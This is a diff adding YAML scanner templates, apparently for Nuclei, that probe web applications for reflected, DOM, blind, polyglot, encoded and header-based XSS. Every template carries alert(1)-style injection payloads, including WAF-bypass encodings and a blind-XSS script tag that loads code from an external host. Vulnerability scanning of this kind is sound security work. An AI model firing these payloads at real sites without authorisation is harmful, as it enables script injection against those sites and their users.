@@ -1,0 +1,175 @@
+id: basic-xss
+info:
+  name: Basic Reflected XSS
+  author: AniipID
+  severity: high
+  description: Detects basic reflected XSS via script tag injection
+  tags: xss,reflected
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%3Cscript%3Ealert(1)%3C/script%3E"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+        name: "script-alert-reflected"
+---
+id: img-xss
+info:
+  name: Image OnError XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS via img onerror handler
+  tags: xss,reflected,img
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=<img%20src=x%20onerror=alert(1)>"
+    matchers:
+      - type: word
+        words:
+          - "<img src=x onerror=alert(1)>"
+        name: "img-onerror-reflected"
+---
+id: svg-xss
+info:
+  name: SVG OnLoad XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS via SVG onload event
+  tags: xss,reflected,svg
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%3Csvg%20onload=alert(1)%3E"
+    matchers:
+      - type: word
+        words:
+          - "<svg onload=alert(1)>"
+        name: "svg-onload-reflected"
+---
+id: attr-breakout-xss
+info:
+  name: Attribute Breakout XSS
+  author: AniipID
+  severity: critical
+  description: Detects XSS via attribute breakout with event handlers
+  tags: xss,reflected,attr-breakout
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E"
+    payloads:
+      - "\"><img src=x onerror=alert(1)>"
+      - "\"><svg onload=alert(1)>"
+      - "'><img src=x onerror=alert(1)>"
+    matchers:
+      - type: word
+        words:
+          - "\"><img src=x onerror=alert(1)>"
+          - "\"><svg onload=alert(1)>"
+          - "'><img src=x onerror=alert(1)>"
+        condition: or
+        name: "attr-breakout-confirmed"
+---
+id: dom-xss
+info:
+  name: DOM-Based XSS via document.write
+  author: AniipID
+  severity: critical
+  description: Detects DOM-based XSS via document.write sink
+  tags: xss,dom
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%3Cscript%3Edocument.write(%27%3Cimg%20src=x%20onerror=alert(1)%3E%27)%3C/script%3E"
+    matchers:
+      - type: word
+        words:
+          - "document.write('<img src=x onerror=alert(1)>')"
+        name: "dom-document-write"
+---
+id: blind-xss
+info:
+  name: Blind XSS via Callback
+  author: AniipID
+  severity: medium
+  description: Detects blind XSS by injecting external script callback
+  tags: xss,blind
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%3Cscript%20src=https://xss.report/test%3E%3C/script%3E"
+    matchers:
+      - type: word
+        words:
+          - "xss.report"
+        name: "blind-xss-callback"
+---
+id: polyglot-xss
+info:
+  name: Polyglot XSS Injection
+  author: AniipID
+  severity: high
+  description: Detects XSS via polyglot injection vectors
+  tags: xss,polyglot,waf-bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%22%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E"
+      - "{{BaseURL}}?q=%22/%3E%3Cimg%20src=x%20onerror=alert(1)%3E"
+    payloads:
+      - "\"'><img src=x onerror=alert(1)>"
+      - "\"/><img src=x onerror=alert(1)>"
+      - "</textarea><script>alert(1)</script>"
+      - "</style><script>alert(1)</script>"
+    matchers:
+      - type: word
+        words:
+          - "><img src=x onerror=alert(1)>"
+          - "alert(1)</script>"
+        condition: or
+        name: "polyglot-confirmed"
+---
+id: js-encode-xss
+info:
+  name: JavaScript Encoded XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS with JavaScript encoding/obfuscation bypass
+  tags: xss,waf-bypass,obfuscation
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%3Cimg%20src=x%20onerror=&#97;&#108;&#101;&#114;&#116;(1)%3E"
+      - "{{BaseURL}}?q=%3Cscript%3Eeval(atob('YWxlcnQoMSk='))%3C/script%3E"
+    matchers:
+      - type: regex
+        regex:
+          - "&#\\d{2,3};"
+          - "atob\\('"
+          - "String\\.fromCharCode"
+        condition: or
+        name: "encoded-js-confirmed"
+---
+id: xss-in-header
+info:
+  name: XSS via HTTP Header Injection
+  author: AniipID
+  severity: high
+  description: Detects XSS in HTTP response headers (User-Agent, Referer reflection)
+  tags: xss,header
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "<script>alert(1)</script>"
+      Referer: "https://evil.com/<script>alert(1)</script>"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+        part: header
+        name: "xss-in-header"
